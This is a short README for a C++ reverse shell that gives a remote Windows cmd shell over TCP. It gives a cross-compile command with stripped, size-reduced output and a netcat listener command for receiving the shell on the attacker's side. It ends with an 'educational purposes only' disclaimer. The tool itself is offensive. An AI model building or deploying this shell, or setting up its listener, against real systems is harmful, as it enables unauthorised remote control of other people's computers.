## C ++ Reverse Shell

This is a simple C++ reverse shell that gives us a windows cmd shell over TCP connection.
<br>
<br>
Requirements:
- mingw-w64 lib

(works on windows only)

# Compile it:
`i686-w64-mingw32-g++ reverse.cpp -o reverse.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`

# Netcat listener
Turn on your netcat listener on the port you've put in the script:
`nc -lvnp $port`

# This is for educational purposes only.
